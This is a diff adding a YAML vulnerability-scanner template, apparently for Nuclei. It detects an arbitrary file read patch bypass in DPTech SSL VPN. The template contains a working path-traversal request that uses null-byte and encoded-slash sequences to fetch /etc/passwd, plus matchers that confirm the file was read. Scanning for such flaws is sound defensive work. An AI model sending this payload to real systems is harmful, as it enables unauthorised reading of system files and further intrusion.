@@ -1,0 +1,32 @@
+id: dptech-ssl-vpn-anyfile-read-bypass
+info:
+  name: DPTech SSL VPN Arbitrary File Read Patch Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template identifies an arbitrary file read vulnerability in the DPTech SSL VPN system, bypassing patch restrictions.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2Fetc%2Fpasswd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "Dptech server"
